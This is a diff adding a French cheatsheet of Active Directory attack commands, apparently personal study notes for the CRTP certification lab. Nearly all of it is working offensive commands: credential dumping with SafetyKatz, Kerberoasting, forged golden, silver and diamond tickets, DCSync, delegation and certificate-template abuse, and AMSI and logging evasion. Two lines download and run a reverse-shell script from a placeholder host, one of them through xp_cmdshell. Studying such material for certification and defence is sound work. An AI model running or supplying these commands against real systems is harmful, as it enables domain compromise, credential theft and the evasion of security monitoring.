@@ -1,0 +1,207 @@
+# Cheatsheet - Toutes les commandes (index central)
+
+> [!summary] Toutes les commandes de la Vault centralisées, dans l'ordre de la kill-chain CRTP (LO1→23 du LabManual). Cœur = forme générique réutilisable ; les valeurs exactes du lab et le détail sont dans la fiche liée à chaque section. Cadre lab/cert : voir [[CRTP - Index]].
+
+> [!tip]- Conventions
+> `<DOMAIN>` `<DC_FQDN>` `<host>` `<USER>` `<hash>` `<key>` `<IP>` `<pfx>` = à remplacer. Le lab exécute les outils PowerShell via **InviShell** (moins de logs) et les binaires via **Loader.exe** (build obfusqué `evasive-*`, exécution en mémoire).
+
+## Setup / OPSEC
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat        # shell enum sans logging verbeux
+. C:\AD\Tools\PowerView.ps1                              # charger PowerView
+Loader.exe -path C:\AD\Tools\<Tool>.exe -args "<cmd>" "exit"   # exec en mémoire d'un binaire obfusqué
+# AMSI bypass : one-liner du LabManual (Lab Instructions) — cf. [[Cheatsheet - Évasion et OPSEC]]
+```
+
+## Énumération domaine · LO1 → [[Cheatsheet - Reconnaissance AD]]
+
+```powershell
+Get-Domain ; Get-ADDomain                                # domaine courant
+Get-Domain -Domain <DOMAIN>                              # autre domaine
+Get-DomainSID ; (Get-ADDomain).DomainSID                 # SID domaine
+Get-DomainController ; Get-ADDomainController -Discover   # DC
+Get-DomainPolicyData                                     # politique de domaine
+Get-DomainUser [-Identity <USER>] [-SPN]                 # users (SPN = comptes kerberoastables)
+Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
+Get-DomainComputer | select -ExpandProperty dnshostname  # machines
+Get-DomainGroup -Identity "Domain Admins"                # groupes
+Get-DomainGroupMember -Identity "Domain Admins"
+Get-DomainGroupMember -Identity "Enterprise Admins" -Domain <DOMAIN>
+Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\   # partages SMB accessibles
+```
+
+## ACL / permissions · LO2 → [[Cheatsheet - ACL et droits AD]]
+
+```powershell
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<USER>"}
+```
+
+## OU & GPO · LO3, LO6 → [[Cheatsheet - GPO et OU]]
+
+```powershell
+Get-DomainOU ; Get-DomainOU | select -ExpandProperty name
+(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_}
+Get-DomainGPO ; Get-DomainGPO -Identity '<GPO Name>'
+(Get-DomainOU -Identity DevOps).gplink                   # GPO liés à l'OU
+```
+
+## Trusts & forêt · LO4 → [[Cheatsheet - Trusts et forêts]]
+
+```powershell
+Get-DomainTrust                                          # trusts du domaine courant
+Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name}    # tous les trusts de la forêt
+Get-ForestDomain -Forest <FOREST> | %{Get-DomainTrust -Domain $_.Name}   # trusts externes
+Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}   # SID filtering actif ?
+```
+
+## BloodHound / SharpHound · LO1 → [[Cheatsheet - BloodHound SharpHound]]
+
+```powershell
+SharpHound.exe --collectionmethods All --domain <DOMAIN>
+Invoke-BloodHound -CollectionMethod All                  # variante PowerShell
+```
+
+## Privesc local · LO5 → [[Cheatsheet - Privilege escalation]]
+
+```powershell
+. C:\AD\Tools\PowerUp.ps1 ; Invoke-AllChecks             # chemins de privesc
+Invoke-ServiceAbuse -Name '<service>' -UserName '<DOMAIN>\<USER>'   # abuser un service faible
+Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args ""     # WinPEAS
+. C:\AD\Tools\PrivEscCheck.ps1 ; Invoke-PrivescCheck
+# Jenkins : exécuter une commande via un job → reverse shell
+powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
+```
+
+## Chasse aux sessions / local admin · LO7 → [[Cheatsheet - Lateral movement]]
+
+```powershell
+. C:\AD\Tools\Invoke-SessionHunter.ps1 ; Invoke-SessionHunter -NoPortScan -RawResults
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 ; Find-PSRemotingLocalAdminAccess
+Find-DomainUserLocation                                  # où un DA a une session (PowerView)
+```
+
+## Mouvement latéral · LO7 → [[Cheatsheet - Lateral movement]]
+
+```powershell
+winrs -r:<host> cmd                                      # exécution distante
+# OverPass-the-Hash : rejouer des creds via TGT
+Loader.exe -path Rubeus.exe -args asktgt /user:<USER> /aes256:<key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>
+# Applocker bloque Loader → utiliser Invoke-Mimi modifié (Invoke-MimiEx.ps1) copié sur la cible
+```
+
+> [!tip]- Dans quel cas (latéral)
+> `winrs`/PSRemoting quand `Find-PSRemotingLocalAdminAccess` renvoie un hôte. OverPass-the-Hash quand tu as un hash/clé mais pas le mot de passe clair. MimiEx quand Applocker bloque les binaires (ps1 en dot-source autorisé).
+
+## Extraction de secrets → [[Cheatsheet - Post-exploitation]]
+
+```powershell
+Loader.exe -path SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"          # clés AES/NTLM en mémoire
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"     # dump LSA
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<DOMAIN>\krbtgt" "exit"
+```
+
+## Kerberoasting / AS-REP · LO14 → [[Cheatsheet - Kerberoasting]] · [[Cheatsheet - AS-REP Roasting]]
+
+```powershell
+Rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /user:<USER> /simple /rc4opsec /outfile:hashes.txt   # retirer :port du SPN avant John
+Rubeus.exe asreproast /user:<USER> /format:hashcat /outfile:asrep.txt
+john.exe --wordlist:<wordlist> hashes.txt
+```
+
+## Tickets forgés (Golden / Silver / Diamond) · LO8-10 → [[Cheatsheet - Tickets Kerberos]]
+
+```powershell
+Rubeus.exe golden  /aes256:<krbtgt_key> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd /ptt
+Rubeus.exe silver  /service:http/<DC_FQDN> /rc4:<machine_hash> /sid:<DOMAIN_SID> /ldap /user:Administrator /ptt
+Rubeus.exe diamond /krbkey:<krbtgt_key> /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
+```
+
+## DCSync · LO12 → [[Cheatsheet - Persistence]]
+
+```powershell
+Rubeus.exe dcsync /user:<DOMAIN>\krbtgt
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<DOMAIN>\krbtgt" "exit"
+```
+
+## Persistance · LO11 → [[Cheatsheet - Persistence]]
+
+```powershell
+# DSRM : réutiliser le hash de l'admin DSRM du DC pour du PtH sur le DC
+# Golden/Diamond ticket (cf. Tickets Kerberos) · AdminSDHolder / ACL abuse
+```
+
+## Délégation non-contrainte + coercition · LO15 → [[Cheatsheet - Delegation attacks]]
+
+```powershell
+Get-DomainComputer -Unconstrained | select -ExpandProperty name
+Rubeus.exe monitor /targetuser:<DC$> /interval:5 /nowrap        # écouter les TGT capturés
+# forcer l'auth du DC (une des 3) :
+MS-RPRN.exe \\<DC_FQDN> \\<attacker_host>                        # Printer Bug (MS-RPRN)
+Loader.exe -path WSPCoerce.exe -args "<DC> <attacker_host>"     # MS-WSP
+# MS-DFSNM en alternative
+# puis rejouer le TGT du DC$ avec Rubeus ptt → DCSync
+```
+
+## Délégation contrainte (S4U) · LO16 → [[Cheatsheet - Delegation attacks]]
+
+```powershell
+Get-DomainUser -TrustedToAuth ; Get-DomainComputer -TrustedToAuth
+Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /altservice:<svc> /ptt
+```
+
+## RBCD · LO17 → [[Cheatsheet - RBCD]]
+
+```powershell
+Set-DomainRBCD -Identity <target>$ -DelegateFrom <controlled>$   # écrire msDS-AllowedToActOnBehalfOf
+Get-DomainRBCD
+Rubeus.exe s4u /user:<controlled>$ /aes256:<hash> /msdsspn:http/<target> /impersonateuser:administrator /ptt
+```
+
+## Abus de trusts (intra-forêt / inter-forêt) · LO18-20 → [[Cheatsheet - Trusts et forêts]]
+
+```powershell
+# 1. extraire la clé de trust
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+# 2. forger un TGT inter-realm (enfant→parent) puis demander un TGS du service cible
+Rubeus.exe golden /rc4:<trust_key> /netbios:dcorp /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:<parent> /ptt
+Rubeus.exe asktgs /service:http/<parent_DC> /dc:<parent_DC> /ptt
+# 3. inter-forêt : forger un referral ticket (SID History filtré) puis TGS cross-forest
+Rubeus.exe asktgs /service:cifs/<forest_DC> /dc:<forest_DC> /ptt
+```
+
+## AD CS · LO21 → [[Cheatsheet - AD CS et certificats]]
+
+```powershell
+Certify.exe cas                                         # CAs de la forêt
+Certify.exe find ; Certify.exe find /vulnerable         # templates
+Certify.exe find /enrolleeSuppliesSubject               # ESC1 (SAN arbitraire)
+Certify.exe request /ca:<CA> /template:<tmpl> /altname:administrator          # ESC1
+Rubeus.exe asktgt /user:administrator /certificate:<pfx> /password:<pw> /ptt
+# ESC3 : demander un cert Enrollment Agent, puis /onbehalfof:<DOMAIN>\administrator
+Certify.exe request /ca:<CA> /template:<EA_tmpl> /onbehalfof:<DOMAIN>\administrator /enrollcert:<agent_pfx>
+```
+
+## MSSQL & database links · LO22 → [[Cheatsheet - MSSQL et PowerUpSQL]]
+
+```powershell
+Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose               # instances SQL du domaine
+Get-SQLServerLinkCrawl -Instance <instance>                     # crawler les liens de BDD
+Get-SQLServerLinkCrawl -Instance <instance> -Query "exec master..xp_cmdshell 'whoami'"
+Get-SQLServerLinkCrawl -Instance <instance> -Query "exec master..xp_cmdshell 'powershell iex(iwr http://<IP>/Invoke-PowerShellTcpEx.ps1)'" -QueryTarget <target>
+```
+
+## Évasion / OPSEC · LO23 → [[Cheatsheet - Évasion et OPSEC]]
+
+```powershell
+# LSASS dump via API custom (FindLSASSPID.exe) · ASR rules bypass · opsec MDE/MDI
+# AMSI bypass · InviShell (RunWithRegistryNonAdmin.bat) · Loader (evasive-*)
+```
+
+---
+
+**Fiches détaillées :** [[Cheatsheet - Reconnaissance AD]] · [[Cheatsheet - Tickets Kerberos]] · [[Cheatsheet - Kerberoasting]] · [[Cheatsheet - Delegation attacks]] · [[Cheatsheet - RBCD]] · [[Cheatsheet - AD CS et certificats]] · [[Cheatsheet - MSSQL et PowerUpSQL]] · [[Checklist - Méthodologie CRTP]]
